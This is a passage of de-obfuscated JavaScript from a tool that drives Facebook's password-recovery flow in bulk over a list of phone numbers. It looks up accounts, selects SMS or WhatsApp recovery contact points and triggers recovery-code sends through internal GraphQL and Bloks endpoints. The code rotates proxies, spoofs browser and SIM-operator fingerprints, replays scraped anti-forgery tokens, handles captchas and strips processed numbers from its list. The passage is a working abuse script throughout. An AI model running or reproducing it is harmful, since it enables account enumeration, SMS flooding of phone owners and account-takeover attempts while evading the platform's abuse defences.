    v1172.family_device_id = '', v1172.machine_id = '', v1172.zero_balance_state = '', v1172.auth_option = "phone", v1172.android_build_type = '', v1172.selected_phone_number_index = null, v1172.selected_xapp_contactpoint_index = 0x0, v1172.selected_encrypted_bloks_xapp_cp_lookup_data = '', v1172.cloud_trust_token = null, v1172.network_bssid = null, v1172.lois_settings = v1171, v1172.aac = '';
    const v1173 = v1172,
      v1174 = await fn21("com.bloks.www.caa.ar.auth_option_selection.async", "action", v1170, v1173);
    if (v1174 && v1174.data) {
      const v1205 = v1174.data,
        v1206 = v1205.replace(/[^\x20-\x7E]/g, '').slice(0x0, 0x12c);
      dbg("[BLOKS OPTION RESP] encoding=" + (v1174.encoding || "unknown") + " len=" + v1205.length + " printable=" + v1206);
      if (v1205.includes("no_sms") || v1205.includes("no_phone") || v1205.includes("email_only")) {
        dbg('+' + v1133 + " BLOKS OPTION FAIL: no SMS available");
        const v1209 = {};
        return v1209.ok = false, v1209.result = "no_sms", v1209;
      }
      const v1207 = v1205.includes("CODE_ENTRY") || v1205.includes("code_entry") || v1205.includes("code_send_succ");
      dbg("[BLOKS OPTION] SMS trigger markers present: " + v1207);
      const v1208 = v1205.match(/"(Ad[A-Za-z0-9_\-+/]{50,}\|arm)"/);
      if (v1208) v1134.contextData = v1208[0x1], dbg("[BLOKS OPTION] Updated context_data (DSL): " + v1134.contextData.slice(0x0, 0x28) + "...");else {
        const v1210 = v1205.match(/"context_data"\s*:\s*"([^"]+)"/);
        v1210 && (v1134.contextData = v1210[0x1], dbg("[BLOKS OPTION] Updated context_data (JSON): " + v1134.contextData.slice(0x0, 0x28) + "..."));
      }
    } else dbg("[BLOKS OPTION] No response from auth_option_selection.async");
    dbg('++' + v1133 + " BLOKS SMS triggered via auth_option_selection.async (phone) — context_data=" + (v1134.contextData ? v1134.contextData.slice(-8) : "NULL"));
    const v1175 = {};
    v1175.id = v1134.accountUid || '0';
    const v1176 = {};
    return v1176.ok = true, v1176.accounts = [v1175], v1176.searchCipher = v1134.contextData, v1176.searchCuid = null, v1176.redirectUri = null, v1176.wfId = v1141, v1176.evId = v1142, v1176;
  }
  const v1143 = {};
  v1143.cipher_text = v1134.initialCipher || null, v1143.context = "recover", v1143.event_request_id = v1142, v1143.friend_name = '', v1143.search_query = v1133, v1143.waterfall_id = v1141;
  const v1144 = v1143,
    v1145 = {};
  v1145.params = v1144;
  const v1146 = buildParams(v1134, "27012969198380071", "CAAFBAccountSearchViewQuery", v1145, v1137, v1138);
  const v1147 = v1139 || "https://www.facebook.com/login/identify/",
    v1148 = await graphqlPost(v1146, buildHeaders(v1134, v1136, "CAAFBAccountSearchViewQuery", v1138, v1147), 0x3a98, v1135, "www.facebook.com"),
    v1149 = parseResp(v1148.data);
  if (v1148.status !== 0xc8) return {
    'ok': false,
    'error': "HTTP " + v1148.status
  };
  const v1150 = {};
  v1150.ok = false, v1150.error = "Parse failed";
  if (!v1149) return v1150;
  if (v1149.errors) {
    dbg('+' + v1133 + " GRAPHQL ERROR: " + JSON.stringify(v1149.errors));
    const v1211 = {};
    return v1211.ok = false, v1211.error = "GraphQL error", v1211;
  }
  const v1151 = v1149?.["data"]?.["caa_ar_fb_account_search"];
  if (!v1151 || !v1151.accounts || v1151.accounts.length === 0x0) {
    dbg('+' + v1133 + " SEARCH FAIL: no_account");
    const v1212 = {};
    return v1212.ok = false, v1212.result = "no_account", v1212;
  }
  dbg("[SEARCH] " + v1151.accounts.length + " account(s) found");
  const fn19 = v1213 => v1213 && !String(v1213).startsWith("17848") && !String(v1213).startsWith("17849") && !(Number(v1213) >= 0x6553f100 && Number(v1213) <= 0x77359400),
    fn20 = v1214 => v1214 && v1214 !== '0' && v1214 !== "deleted" && fn19(String(v1214)) && /^\d{8,16}$/.test(String(v1214)),
    v1152 = v1151.accounts[0x0];
  if (v1152) {
    const v1215 = [v1152.id, v1152.account_id, v1152.user_id, v1152.profile_id, v1152.fbid, v1152.uid, v1152.actor_id].find(fn20);
    v1215 && (v1134.accountUid = String(v1215), v1134.searchUid = String(v1215), cdbg("[SEARCH] Extracted accountUid: " + v1134.accountUid));
  }
  let v1153 = v1151.cipher || v1151.cipher_text || null;
  if (!v1153 && v1151.redirect_uri) {
    const v1216 = v1151.redirect_uri.match(/[?&]ci=([^&]+)/);
    if (v1216) v1153 = v1216[0x1];
  }
  !v1153 && v1152 && (v1153 = v1152.cipher || v1152.cipher_text || null);
  !v1153 && (v1153 = v1134.initialCipher || null);
  const v1154 = v1151.accounts[0x0] && v1151.accounts[0x0].cuid || null;
  if (v1154) dbg("[SEARCH] cuid extracted: " + v1154.slice(0x0, 0xc) + "...");
  const v1155 = {};
  v1155.ok = true, v1155.accounts = v1151.accounts, v1155.searchCipher = v1153;
  v1155.searchCuid = v1154;
  return v1155.redirectUri = v1151.redirect_uri, v1155.wfId = v1141, v1155.evId = v1142, v1155;
}
async function selectAccount(v1217, v1218, v1219, v1220, v1221, v1222, v1223, v1224, v1225, v1226 = null) {
  const v1227 = v1226 || v1220.waterfallId || uuid();
  v1220.waterfallId = v1227;
  const v1228 = buildParams(v1220, "9730637087034984", "useCAAAccountSearchSelectMutation", {
      'input': {
        'actor_id': '0',
        'client_mutation_id': '1',
        'access_flow_version': "pre_mt_behavior",
        'cipher': v1218,
        'idx': v1219,
        'waterfall_id': v1227
      }
    }, v1223, v1224),
    v1229 = await graphqlPost(v1228, buildHeaders(v1220, v1222, "useCAAAccountSearchSelectMutation", v1224, v1225 || "https://www.facebook.com/login/identify/"), 0x3a98, v1221, "www.facebook.com"),
    v1230 = parseResp(v1229.data);
  const v1231 = {};
  v1231.ok = false, v1231.error = "selectAccount failed";
  if (v1229.status !== 0xc8 || !v1230 || v1230.errors) return v1231;
  const v1232 = v1230?.["data"]?.["caa_ar_fb_search_select_account"],
    v1233 = v1232?.["select_uri"] || '',
    v1234 = v1233.match(/[?&]ci=([^&]+)/),
    v1235 = v1234 ? v1234[0x1] : null;
  dbg("[SELECT] select_uri=" + v1233.substring(0x0, 0x3c) + " cipher=" + (v1235 ? "..." + v1235.slice(-8) : "NULL")), mergeCookies(v1220, v1229.headers);
  const v1236 = {};
  v1236.ok = true;
  return v1236.selectCipher = v1235, v1236;
}
async function getInitiateView(v1237, v1238, v1239, v1240, v1241, v1242, v1243, v1244 = null) {
  const v1245 = v1244 || v1238.waterfallId || uuid();
  v1238.waterfallId = v1245;
  const v1246 = {};
  v1246.cipher = v1237, v1246.waterfall_id = v1245;
  const v1247 = {};
  v1247.params = v1246;
  const v1248 = buildParams(v1238, "29028192460103922", "CAAFBARInitiateViewPushableQuery", v1247, v1241, v1242, "comet.fbweb.CometCAAARInitiateViewRoute"),
    v1249 = await graphqlPost(v1248, buildHeaders(v1238, v1240, "CAAFBARInitiateViewPushableQuery", v1242, v1243 || "https://www.facebook.com/login/identify/"), 0x3a98, v1239, "www.facebook.com"),
    v1250 = parseResp(v1249.data);
  dbg("[INITIATE] HTTP " + v1249.status + " | parsed=" + !!v1250 + " | errors=" + (v1250?.["errors"] ? JSON.stringify(v1250.errors[0x0]) : "none"));
  const v1251 = {};
  v1251.ok = false, v1251.error = "initiateView failed";
  if (v1249.status !== 0xc8 || !v1250 || v1250.errors) return v1251;
  mergeCookies(v1238, v1249.headers);
  const v1252 = v1250?.["data"]?.["caa_ar_fb_initiate_view"];
  dbg("[INITIATE] allow_display=" + v1252?.["allow_display"] + " cipher=" + (v1252?.["cipher"] ? '✓' : "NULL") + " opts=" + (v1252?.["contactpoint_options"]?.["length"] || 0x0));
  const v1253 = {};
  v1253.ok = false, v1253.error = "no initiate view";
  if (!v1252) return v1253;
  const v1254 = v1252.contactpoint_options || v1252.contact_point_options || v1252.recovery_options || [],
    v1255 = v1252.preselected_cp || null;
  const v1256 = v1252.profiles || [];
  let v1257 = v1252.cipher_text || v1252.cipher || v1255?.["cipher_text"] || v1255?.["cipher"] || null,
    v1258 = "send_sms",
    v1259 = null;
  if (v1254.length > 0x0) {
    v1259 = v1254.find(v1264 => {
      const v1265 = (v1264.key || v1264.type || v1264.method || v1264.contact_type || '').toLowerCase();
      return v1265.includes("sms") || v1265.includes("phone") || v1265.includes("mobile") || v1265.includes("whatsapp") || v1265.includes('wa') || v1265.includes("viber");
    }) || v1254[0x0];
    if (!v1257) v1257 = v1259?.["cipher_text"] || v1259?.["cipher"] || null;
  }
  if (!v1257 && v1256.length > 0x0) for (const v1266 of v1256) {
    const v1267 = v1266.contact_points || v1266.contactpoint_options || v1266.contact_point_options || v1266.recovery_options || [],
      v1268 = v1266.preselected_cp || null;
    if (!v1257 && v1268 && typeof v1268 === "object") {
      v1257 = v1268.cipher_text || v1268.cipher || null;
      if (!v1259) v1259 = v1268;
    }
    for (const v1269 of v1267) {
      const v1270 = (v1269.key || v1269.type || v1269.method || v1269.contact_type || '').toLowerCase(),
        v1271 = v1269.cipher_text || v1269.cipher;
      !v1259 && (v1270.includes("sms") || v1270.includes("phone") || v1270.includes("mobile") || v1270.includes("text") || v1270.includes("whatsapp") || v1270.includes("viber")) && (v1259 = v1269), v1271 && !v1257 && (v1257 = v1269.cipher_text || v1269.cipher);
    }
    if (v1257 && v1259) break;
  }
  if (!v1259 && v1256.length > 0x0) for (const v1272 of v1256) {
    const v1273 = v1272.contact_points || v1272.contactpoint_options || v1272.contact_point_options || v1272.recovery_options || [];
    v1259 = v1273.find(v1274 => {
      const v1275 = (v1274.key || v1274.type || '').toLowerCase();
      return v1275.includes("sms") || v1275.includes("phone") || v1275.includes("mobile") || v1275.includes("whatsapp");
    }) || v1273[0x0] || null;
    if (v1259) break;
  }
  if (v1259) v1258 = v1259.key || v1259.type || v1259.method || v1259.contact_type || "send_sms";else typeof v1252.preselected_cp === "string" && v1252.preselected_cp && (v1258 = v1252.preselected_cp);
  dbg("[INITIATE] cipher=" + (v1257 ? "..." + v1257.slice(-8) : "NULL") + " method=" + v1258 + " profiles=" + v1256.length + " flatOpts=" + v1254.length);
  const v1260 = {};
  v1260.ok = false, v1260.error = "no cipher in initiate view";
  if (!v1257) return v1260;
  const v1261 = v1258 && v1258.toLowerCase().startsWith("send_email"),
    v1262 = {};
  v1262.ok = false, v1262.error = "no_sms";
  if (v1261) return v1262;
  const v1263 = {};
  return v1263.ok = true, v1263.cipher = v1257, v1263.recoverMethod = v1258, v1263;
}
async function conversationalSupportQuery(v1276, v1277, v1278, v1279, v1280, v1281, v1282 = null, v1283 = null, v1284 = null, v1285 = null) {
  const v1286 = v1281 || "https://www.facebook.com/recover/initiate/?ci=" + encodeURIComponent(v1276),
    v1287 = {};
  v1287.cipher = v1276, v1287.cuid = v1282 || null, v1287.existing_token = v1283 || null;
  const v1288 = {};
  v1288.request = v1287;
  const v1289 = buildParams(v1277, "27102018216149070", "ConversationalSupportFBFPChatExperienceQuery", v1288, 0x0, v1280, "comet.fbweb.CometCAAARInitiateViewRoute"),
    v1290 = Date.now(),
    v1291 = uuid(),
    v1292 = v1284 || "upl_wizard_" + v1290 + '_' + v1291;
  const v1293 = v1285 || "upl_" + v1290 + '_' + uuid(),
    v1294 = buildHeaders(v1277, v1279, "ConversationalSupportFBFPChatExperienceQuery", v1280, v1286),
    v1295 = {
      'Accept': v1294.Accept,
      'Accept-Encoding': v1294["Accept-Encoding"],
      'Accept-Language': v1294["Accept-Language"],
      'Content-Type': v1294["Content-Type"],
      'Cookie': v1294.Cookie,
      'Origin': v1294.Origin,
      'Priority': v1294.Priority,
      'Referer': v1294.Referer,
      ...Object.fromEntries(Object.entries(v1294).filter(([v1296]) => v1296.startsWith("sec-ch-"))),
      'sec-fetch-dest': v1294["sec-fetch-dest"],
      'sec-fetch-mode': v1294["sec-fetch-mode"],
      'sec-fetch-site': v1294["sec-fetch-site"],
      'User-Agent': v1294["User-Agent"],
      'X-ASBD-ID': v1294["X-ASBD-ID"],
      'x-bh-flowsessionid': v1292,
      'X-FB-Friendly-Name': v1294["X-FB-Friendly-Name"],
      'X-FB-LSD': v1294["X-FB-LSD"],
      'x-fb-upl-sessionid': v1293
    };
  try {
    const v1297 = await graphqlPost(v1289, v1295, 0x2ee0, v1278, "www.facebook.com");
    mergeCookies(v1277, v1297.headers);
    const v1298 = parseResp(v1297.data),
      v1299 = v1298?.["data"]?.["init_conversational_support_attempt_for_fb_forgot_password"] || v1298?.["data"]?.["conversational_support_fbfp_chat_experience"] || null,
      v1300 = v1299?.["cuid"] || null,
      v1301 = v1299?.["attempt_token"] || v1299?.["token"] || v1299?.["session_token"] || null;
    dbg("[CHAT SUPPORT] HTTP " + v1297.status + " cuid=" + (v1300 ? '✓' : "null") + " token=" + (v1301 ? '✓' : "null"));
    const v1302 = {};
    return v1302.ok = true, v1302.cuid = v1300, v1302.token = v1301, v1302.flowSessionId = v1292, v1302.uplSessionId = v1293, v1302;
  } catch (v1303) {
    dbg("[CHAT SUPPORT] skipped (" + v1303.message + ')');
    const v1304 = {};
    return v1304.ok = false, v1304.cuid = null, v1304.token = null, v1304.flowSessionId = v1292, v1304.uplSessionId = v1293, v1304;
  }
}
async function sendOTP(v1305, v1306, v1307, v1308, v1309, v1310, v1311, v1312, v1313, v1314) {
  v1309.clientMutationId = (v1309.clientMutationId || 0x0) + 0x1;
  const v1315 = {
    'input': {
      'actor_id': '0',
      'client_mutation_id': String(v1309.clientMutationId),
      'access_flow_version': "pre_mt_behavior",
      'cipher': v1307,
      'event_request_id': v1306,
      'recover_method': v1308,
      'waterfall_id': v1305
    },
    'scale': 0x1
  };
  const v1316 = buildParams(v1309, "25714184854871712", "useCAASendRecoveryCodeMutation", v1315, v1312, v1313),
    v1317 = v1314 || "https://www.facebook.com/login/identify/";
  if (SELECTED_BROWSER === "via_browser") {
    dbg("[SEND] Via Browser Mode: Executing m.facebook.com Bloks SMS captcha async send for cipher=" + v1307.slice(0x0, 0xf) + "...");
    const v1328 = "/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.sms_captcha.async&type=action&__bkv=8d7a099705c6918973f9eb638946ec70f8b902374eed3558006659bdf45d268b",
      v1329 = {
        'event_request_id': v1306,
        'INTERNAL__latency_qpl_marker_id': 0x2301b43,
        'INTERNAL__latency_qpl_instance_id': String(Date.now()) + '00',
        'device_id': null,
        'family_device_id': null,
        'waterfall_id': v1305,
        'offline_experiment_group': null,
        'layered_homepage_experiment_group': null,
        'is_platform_login': 0x0,
        'is_from_logged_in_switcher': 0x0,
        'is_from_logged_out': 0x0,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "unknown",
        'context_data': v1309.contextData || ''
      },
      v1330 = {};
    v1330.cipher = v1307, v1330.cuid = v1309.accountUid || null, v1330.contact_point_type = "sms", v1330.recovery_method = "send_sms";
    const v1331 = v1330,
      v1332 = {};
    v1332.server_params = v1329, v1332.client_input_params = v1331;
    const v1333 = JSON.stringify({
        'params': JSON.stringify(v1332)
      }),
      v1334 = new URLSearchParams();
    v1334.set("__aaid", '0'), v1334.set("__user", '0'), v1334.set("__a", '1');
    if (!v1309.__req) v1309.__req = 0xa;
    v1334.set("__req", (v1309.__req++).toString(0x10)), v1334.set("__hs", v1309.__hs || "20687.BP:wbloks_caa_pkg.2.0...0"), v1334.set("dpr", '3'), v1334.set("__ccg", "EXCELLENT"), v1334.set("__rev", v1309.rev || "1045798079"), v1334.set("__s", v1309.__s || ''), v1334.set("__hsi", v1309.hsi || String(Date.now())), v1334.set("__dyn", v1309.__dyn || ''), v1334.set("fb_dtsg", v1309.fb_dtsg || '');
    let v1335 = "24976";
    if (v1309.fb_dtsg) {
      let v1342 = 0x0;
      for (let v1343 = 0x0; v1343 < v1309.fb_dtsg.length; v1343++) v1342 += v1309.fb_dtsg.charCodeAt(v1343);
      v1335 = '2' + v1342;
    }
    v1334.set("jazoest", v1309.jazoest || v1335), v1334.set("lsd", v1309.lsd || ''), v1334.set("params", v1333);
    const v1336 = v1314 || "https://m.facebook.com/login/identify/",
      v1337 = await bloksPostPage(v1328, v1334.toString(), v1309.cookieHeader, 0x3a98, "m.facebook.com", v1310, v1311, v1336);
    if (v1337.headers) mergeCookies(v1309, v1337.headers);
    dbg("[SEND VIA BROWSER] HTTP " + v1337.status + " - Data Length: " + (v1337.data ? v1337.data.length : 0x0));
    if (v1337.status !== 0xc8 || !v1337.data) return {
      'ok': false,
      'error': "HTTP " + v1337.status
    };
    const v1338 = v1337.data || '';
    if (v1338.includes("No accounts match") || v1338.includes("no_account_found") || v1338.includes("ACCOUNT_NOT_FOUND")) {
      dbg("[SEND VIA BROWSER] FAIL: no_account");
      const v1344 = {};
      return v1344.ok = false, v1344.error = "no_account", v1344;
    }
    if (v1338.includes("error_message") || v1338.includes("error_code")) {
      const v1345 = v1338.match(/"error_message"\s*:\s*"([^"]+)"/) || v1338.match(/"message"\s*:\s*"([^"]+)"/),
        v1346 = v1345 ? v1345[0x1] : "Bloks SMS send error";
      dbg("[SEND VIA BROWSER] FAIL: " + v1346);
      const v1347 = {};
      return v1347.ok = false, v1347.error = v1346, v1347;
    }
    const v1339 = v1338.match(/[?&]ci=([A-Za-z0-9_\-]+)/) || v1338.match(/"cipher(?:_text)?"\s*:\s*"([A-Za-z0-9_\-]+)"/) || v1338.match(/cipher=([A-Za-z0-9_\-]+)/),
      v1340 = v1339 ? v1339[0x1] : v1307,
      v1341 = {};
    return v1341.ok = true, v1341.sendCipher = v1340, v1341.accountUid = v1309.accountUid || null, v1341;
  }
  const v1318 = buildHeaders(v1309, v1311, "useCAASendRecoveryCodeMutation", v1313, v1317),
    v1319 = await graphqlPost(v1316, v1318, 0x3a98, v1310, "www.facebook.com");
  dbg("[SEND] HTTP " + v1319.status);
  if (v1319.status !== 0xc8) return {
    'ok': false,
    'error': "HTTP " + v1319.status
  };
  const v1320 = parseResp(v1319.data),
    v1321 = {};
  v1321.ok = false, v1321.error = "Parse failed";
  if (!v1320) return v1321;
  if (v1320.errors) {
    const v1348 = v1320.errors[0x0]?.["message"] || "GraphQL error";
    dbg("[SEND] GRAPHQL ERROR: " + v1348 + " | full=" + JSON.stringify(v1320.errors[0x0]));
    const v1349 = {};
    return v1349.ok = false, v1349.error = v1348, v1349;
  }
  const v1322 = v1320?.["data"]?.["caa_ar_fb_send_confirmation_code"];
  dbg("[SEND] result=" + JSON.stringify(v1322));
  const v1323 = {};
  v1323.ok = false, v1323.error = "no result in send response";
  if (!v1322) return v1323;
  const v1324 = {};
  v1324.ok = false, v1324.error = "captcha";
  if (v1322.captcha_persist_data) return v1324;
  const v1325 = v1319.headers && v1319.headers["set-cookie"];
  if (v1325) {
    const v1350 = {};
    (v1309.cookieHeader || '').split(';').forEach(v1352 => {
      const v1353 = v1352.indexOf('=');
      if (v1353 < 0x0) return;
      v1350[v1352.slice(0x0, v1353).trim()] = v1352.slice(v1353 + 0x1).trim();
    });
    const v1351 = Array.isArray(v1325) ? v1325 : [v1325];
    v1351.forEach(v1354 => {
      const v1355 = v1354.split(';')[0x0].split('=');
      if (v1355.length >= 0x2) v1350[v1355[0x0].trim()] = v1355.slice(0x1).join('=').trim();
    }), v1309.cookieHeader = Object.entries(v1350).map(([v1356, v1357]) => v1356 + '=' + v1357).join(';\x20'), dbg("[SEND] Merged " + v1351.length + " cookie(s) into session from sendOTP response");
  }
  let v1326 = null;
  if (v1322.redirect_uri) {
    const v1358 = v1322.redirect_uri.match(/[?&]ci=([A-Za-z0-9_\-]+)/);
    if (v1358) v1326 = v1358[0x1];
    dbg("[SEND] redirect_uri=" + v1322.redirect_uri + " → sendCipher=" + (v1326 ? "..." + v1326.slice(-8) : "NULL"));
    try {
      const v1359 = v1322.redirect_uri.startsWith("http") ? (() => {
        try {
          const v1374 = new URL(v1322.redirect_uri);
          return v1374.pathname + v1374.search;
        } catch (v1375) {
          return v1322.redirect_uri;
        }
      })() : v1322.redirect_uri;
      dbg("[SEND] GET code page (via " + (v1310 ? "proxy" : "direct") + "): " + v1359);
      const v1360 = await httpsGetPageWithRedirects(v1359, v1309.cookieHeader, 0x3a98, "www.facebook.com", v1310, v1311, "https://www.facebook.com/login/identify/");
      if (v1360.cookieHeader) v1309.cookieHeader = v1360.cookieHeader;
      const v1361 = v1360.headers && v1360.headers["set-cookie"];
      if (v1361) {
        const v1376 = {};
        (v1309.cookieHeader || '').split(';').forEach(v1378 => {
          const v1379 = v1378.indexOf('=');
          if (v1379 < 0x0) return;
          v1376[v1378.slice(0x0, v1379).trim()] = v1378.slice(v1379 + 0x1).trim();
        });
        const v1377 = Array.isArray(v1361) ? v1361 : [v1361];
        v1377.forEach(v1380 => {
          const v1381 = v1380.split(';')[0x0].split('=');
          if (v1381.length >= 0x2) {
            const v1382 = v1381[0x0].trim(),
              v1383 = v1381.slice(0x1).join('=').trim();
            if (v1383 !== "deleted" && !v1383.startsWith("deleted;")) v1376[v1382] = v1383;
          }
        }), v1309.cookieHeader = Object.entries(v1376).map(([v1384, v1385]) => v1384 + '=' + v1385).join(';\x20'), dbg("[SEND] Code page merged. sfiu=" + (v1376.sfiu ? "✓ len=" + v1376.sfiu.length : '✗') + " keys=" + Object.keys(v1376).join(','));
      } else dbg("[SEND] Code page: NO set-cookie in response (status=" + v1360.status + ')');
      const v1362 = v1360.data || '',
        v1363 = v1362.match(/"LSD",\[\],\{"token":"([^"]+)"/)?.[0x1];
      if (v1363 && v1363 !== v1309.lsd) {
        v1309.lsd = v1363;
        let v1386 = 0x0;
        for (let v1387 = 0x0; v1387 < v1363.length; v1387++) v1386 += v1363.charCodeAt(v1387);
        v1309.jazoest = '2' + v1386, dbg("[SEND] Updated lsd+jazoest from code page");
      }
      const v1364 = v1362.match(/"__s"\s*:\s*"([a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+)"/);
      v1364 && v1364[0x1] && (v1309.__s_code = v1364[0x1], v1309.__s = v1364[0x1], dbg("[SEND] Extracted __s: " + v1309.__s_code));
      const v1365 = v1362.match(/"haste_session"\s*:\s*"([^"]+)"/) || v1362.match(/"__hs"\s*:\s*"([^"]+)"/);
      v1365 && v1365[0x1] && (v1309.__hs = v1365[0x1], dbg("[SEND] Extracted __hs: " + v1309.__hs));
      const v1366 = v1362.match(/"__dyn"\s*:\s*"([^"]+)"/);
      v1366 && v1366[0x1] && (v1309.__dyn_code = v1366[0x1], v1309.__dyn = v1366[0x1]);
      const v1367 = v1362.match(/"__csr"\s*:\s*"([^"]+)"/);
      v1367 && v1367[0x1] && (v1309.__csr_code = v1367[0x1], v1309.__csr = v1367[0x1]);
      const fn22 = v1388 => v1388 && !v1388.startsWith(':') && !/^[\d,]+$/.test(v1388) && v1388.length > 0xa,
        v1368 = v1362.match(/"__hsdp"\s*:\s*"([^"]+)"/);
      v1368 && fn22(v1368[0x1]) && (v1309.__hsdp_code = v1368[0x1], dbg("[SEND] __hsdp_code from code page (encoded)"));
      const v1369 = v1362.match(/"__hblp"\s*:\s*"([^"]+)"/);
      v1369 && fn22(v1369[0x1]) && (v1309.__hblp_code = v1369[0x1], dbg("[SEND] __hblp_code from code page (encoded)"));
      const v1370 = v1362.match(/"__sjsp"\s*:\s*"([^"]+)"/);
      v1370 && fn22(v1370[0x1]) && (v1309.__sjsp_code = v1370[0x1], dbg("[SEND] __sjsp_code from code page (encoded)"));
      dbg("[SEND] After code page: hsdp_code=" + (v1309.__hsdp_code ? "OK(" + v1309.__hsdp_code.length + ')' : "MISS") + " hblp_code=" + (v1309.__hblp_code ? 'OK' : "MISS") + " sjsp_code=" + (v1309.__sjsp_code ? 'OK' : "MISS"));
      const v1371 = v1362.match(/"__rev"\s*:\s*(\d+)/);
      v1371 && v1371[0x1] && (v1309.rev = v1371[0x1]);
      const v1372 = v1362.match(/"__spin_t"\s*:\s*(\d+)/);
      v1372 && v1372[0x1] && (v1309.spinT = v1372[0x1]);
      const v1373 = v1362.match(/"__hsi"\s*:\s*"?(\d+)"?/);
      v1373 && v1373[0x1] && (v1309.hsi = v1373[0x1]);
    } catch (v1389) {
      dbg("[SEND] Code page GET error: " + v1389.message);
    }
  }
  if (v1322.redirect_uri || v1322.status === "success" || v1322.is_success === true || v1322.sent === true) {
    const v1390 = {};
    return v1390.ok = true, v1390.sendCipher = v1326, v1390;
  }
  const v1327 = {};
  return v1327.ok = false, v1327.error = v1322.error_message || v1322.status || "unknown", v1327;
}
function removeNumberFromFile(v1391, v1392) {
  try {
    const v1393 = v1392.startsWith('+') ? v1392 : '+' + v1392,
      v1394 = fs.readFileSync(v1391, "utf8").split(/\r?\n/),
      v1395 = v1394.filter(v1396 => v1396.trim() !== v1393 && v1396.trim() !== v1392);
    fs.writeFileSync(v1391, v1395.join('\x0a'));
  } catch (v1397) {}
}
function withHardTimeout(v1398, v1399, v1400 = "Request") {
  return new Promise((v1401, v1402) => {
    const v1403 = setTimeout(() => v1402(new Error(v1400 + " hard timeout (" + v1399 + "ms)")), v1399);
    v1398.then(v1404 => {
      clearTimeout(v1403);
      v1401(v1404);
    }).catch(v1405 => {
      clearTimeout(v1403), v1402(v1405);
    });
  });
}
function isProxyLevelError(v1406) {
  if (!v1406) return false;
  const v1407 = (v1406.message || '').toLowerCase(),
    v1408 = (v1406.code || '').toUpperCase();
  if (v1408 === "ECONNREFUSED" || v1408 === "ECONNRESET" || v1408 === "ETIMEDOUT" || v1408 === "ENOTFOUND" || v1408 === "ECONNABORTED" || v1408 === "EHOSTUNREACH" || v1408 === "ENETUNREACH" || v1408 === "EPIPE") return true;
  if (v1407.includes("proxy tcp") || v1407.includes("proxy connection failed") || v1407.includes("socks") || v1407.includes("proxy agent") || v1407.includes("proxy authorization") || v1407.includes("proxy server returned") || v1407.includes("econnrefused") || v1407.includes("econnreset") || v1407.includes("enotfound") || v1407.includes("etimedout") || v1407.includes("ehostunreach") || v1407.includes("enetunreach") || v1407.includes("epipe")) return true;
  return false;
}
async function processNumber(v1409, v1410, v1411 = 0x32, v1412 = 0x0) {
  const v1413 = v1409.startsWith('+') ? v1409 : '+' + v1409;
  let v1414 = -1,
    v1415 = null;
  proxyManager.hasProxies && (v1415 = proxyManager.getNext(v1413), v1414 = proxyManager.index - 0x1);
  const v1416 = getRandomClient(SELECTED_BROWSER, getSimOperators(detectCountry(v1413) || 'US'));
  const v1417 = getPhoneLang(v1413),
    v1418 = v1417.split(',')[0x0].trim().replace('-', '_'),
    v1419 = resolveTimezone(v1415, v1413),
    v1420 = {};
  v1420.host = FB_HOST === "m.facebook.com" ? "m.facebook.com" : "www.facebook.com", v1420.locale = v1418, v1420.lang = v1417;
  const v1421 = v1420;
  dbg(v1413 + " UA:[" + v1416.browserType + '/' + (v1416.isMobile ? "mob" : "desk") + "] lang=" + v1417 + " tz=" + v1419);
  const v1422 = v1416.browserType === "mweb_pixel8" || SELECTED_BROWSER === "via_browser" || v1416.browserType === "via_browser";
  if (FB_HOST === "m.facebook.com" || v1422) {
    dbg("[MFB] " + v1413 + " — routing to m.facebook.com Bloks flow");
    const v1425 = await processNumberMobile(v1409, v1415, v1416, v1417, v1412);
    if (!v1425.ok) {
      const v1427 = {};
      v1427.not_found = "not_found", v1427.bootstrap_fail = "error", v1427.search_fail = "not_found", v1427.initiate_fail = "no_sms", v1427.ar_context_exception = "error", v1427.otp_send_fail = "error", v1427.otp_not_dispatched = "error";
      const v1428 = v1427,
        v1429 = v1428[v1425.error] || "error";
      dbg("[MFB] " + v1413 + " FAIL: " + v1425.error + " → " + v1429);
      const v1430 = {};
      return v1430.result = v1429, v1430.ua = v1416, v1430.proxyIdx = v1414, v1430.proxyStr = v1415 ? v1415.host + ':' + v1415.port : "Direct", v1430.proxy = v1415, v1430;
    }
    dbg("[MFB] " + v1413 + " SUCCESS [m.facebook.com Bloks]");
    const v1426 = {};
    return v1426.result = "success", v1426.ua = v1416, v1426.ctx = v1421, v1426.proxyIdx = v1414, v1426.proxyStr = v1415 ? v1415.host + ':' + v1415.port : "Direct", v1426.proxy = v1415, v1426;
  }
  let v1423;
  const v1424 = proxyManager.hasProxies ? 0x3 : 0x1;
  for (let v1431 = 0x0; v1431 < v1424; v1431++) {
    try {
      v1423 = await withHardTimeout(getOrSeedSession(v1415, v1416, v1421), 0x61a8, "getOrSeedSession");
      if (v1423 && v1423.lsd) break;
    } catch (v1432) {
      dbg('+' + v1413 + " SEED TRY " + (v1431 + 0x1) + " FAIL (" + (v1415 ? v1415.host : "Direct") + "): " + v1432.message), invalidateSessionCache(v1415, v1416, v1421);
      if (proxyManager.hasProxies && v1431 < v1424 - 0x1) {
        if (v1414 >= 0x0 && isProxyLevelError(v1432)) proxyManager.recordFailure(v1414);
        v1415 = proxyManager.getNext(v1413), v1414 = proxyManager.index - 0x1, await sleep(0x3e8);
      } else {
        if (v1431 === v1424 - 0x1) return {
          'result': "error",
          'proxyFault': isProxyLevelError(v1432),
          'ua': v1416,
          'proxyIdx': v1414,
          'proxyStr': v1415 ? v1415.host + ':' + v1415.port : "Direct",
          'proxy': v1415
        };
      }
    }
  }
  try {
    const v1433 = v1423.initialCipher ? "https://www.facebook.com/login/identify/?ci=" + v1423.initialCipher : "https://www.facebook.com/login/identify/",
      v1434 = await withHardTimeout(searchAccount(v1413, v1423, v1415, v1416, v1419, v1417, v1433), 0xea60, "searchAccount");
    if (!v1434.ok) {
      const v1442 = {};
      return v1442.result = v1434.result || "error", v1442.proxyFault = false, v1442.ua = v1416, v1442.proxyIdx = v1414, v1442.proxyStr = v1415 ? v1415.host + ':' + v1415.port : "Direct", v1442.proxy = v1415, v1442;
    }
    let {
      wfId: v1435,
      evId: v1436,
      searchCipher: v1437
    } = v1434;
    dbg("[FLOW] searchCipher=" + (v1437 ? "..." + v1437.slice(-6) : "NULL") + " accounts=" + v1434.accounts.length);
    if (SELECTED_BROWSER === "via_browser" || v1416.browserType === "via_browser") {
      if (!v1437) {
